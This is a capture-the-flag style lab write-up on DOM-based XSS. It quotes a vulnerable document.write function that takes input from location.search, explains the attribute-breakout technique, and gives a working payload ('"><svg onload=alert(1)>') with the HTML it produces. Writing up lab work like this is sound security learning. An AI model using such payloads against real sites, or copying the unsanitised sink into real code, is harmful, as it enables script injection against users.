## Lab 03: DOM XSS in document.write Sink Using location.search Source
 
**Technique:** DOM Based XSS
**Sink:** `document.write`
**Source:** `location.search`
**Status:** Solved
 
### Context
 
This one is different from Labs 01 and 02. The server is not reflecting or storing anything. The vulnerability is entirely in client-side JavaScript. The page reads data from the URL and writes it into the DOM using JavaScript, and the browser executes whatever ends up there.
 
The vulnerable script:
 
```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
```
 
Whatever I search gets dropped directly into the `src` attribute of an `<img>` tag via `document.write`. The problem is there is no sanitisation before it goes in.
 
### Why a Straight Script Tag Does Not Work Here
 
My input lands inside an attribute value:
 
```html
<img src="/resources/images/tracker.gif?searchTerms=MY_INPUT_HERE">
```
 
If I just type `<script>alert(1)</script>` the browser sees:
 
```html
<img src="/resources/images/tracker.gif?searchTerms=<script>alert(1)</script>">
```
 
The browser is still inside the `src` attribute. It renders that as a broken image URL, not as a script. I need to escape out of the attribute first.
 
### The Payload
 
```
"><svg onload=alert(1)>
```
 
What this does:
 
```
"   closes the src attribute value
>   closes the img tag entirely
<svg onload=alert(1)>   injects a new SVG element with an onload event handler
```
 
The resulting HTML becomes:
 
```html
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">
```
 
The `img` tag closes prematurely. The `svg` tag opens. When the SVG loads, `alert(1)` executes. Lab solved.
 
### The Mental Model (Same as SQLi)
 
This is exactly the same thinking as SQL injection. In SQLi you use `'` to break out of the string context and then write your own SQL. Here you use `">` to break out of the HTML attribute context and then write your own markup. The principle is identical: find the delimiters, close them, take control.
 
---
